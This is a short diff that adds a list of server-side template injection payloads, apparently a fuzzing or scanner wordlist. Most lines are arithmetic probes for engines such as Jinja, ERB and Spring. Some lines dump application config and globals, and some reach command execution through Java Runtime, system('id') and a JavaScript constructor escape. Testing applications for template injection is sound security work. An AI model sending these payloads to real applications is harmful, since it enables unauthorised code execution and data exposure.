@@ -1,0 +1,16 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{7*'7'}}
+${7*'7'}
+{{config}}
+{{self.__class__.__mro__}}
+{{''.__class__.__mro__}}
+{{request.application.__globals__}}
+${T(java.lang.Runtime).getRuntime()}
+<%= system('id') %>
+{{constructor.constructor('return this')()}}
+#{7*7}
+*{7*7}
+@(1+1)
